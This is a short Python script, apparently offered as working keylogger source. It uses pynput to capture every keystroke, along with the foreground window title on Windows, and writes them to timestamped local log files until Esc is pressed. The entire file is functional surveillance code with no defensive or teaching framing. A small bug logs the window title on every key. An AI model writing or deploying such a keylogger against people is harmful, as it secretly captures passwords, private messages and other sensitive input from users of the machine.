from pynput import keyboard
import logging
from datetime import datetime
import os
import platform

# Setup log file
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
log_file = f"{log_dir}/keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

current_window = None

def get_active_window_title():
    if platform.system() == "Windows":
        import win32gui
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    else:
        return "Unknown"

def on_press(key):
    global current_window
    active_window = get_active_window_title()
    if active_window != current_window:
        logging.info(f"\n\n[Window: {active_window}]")
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
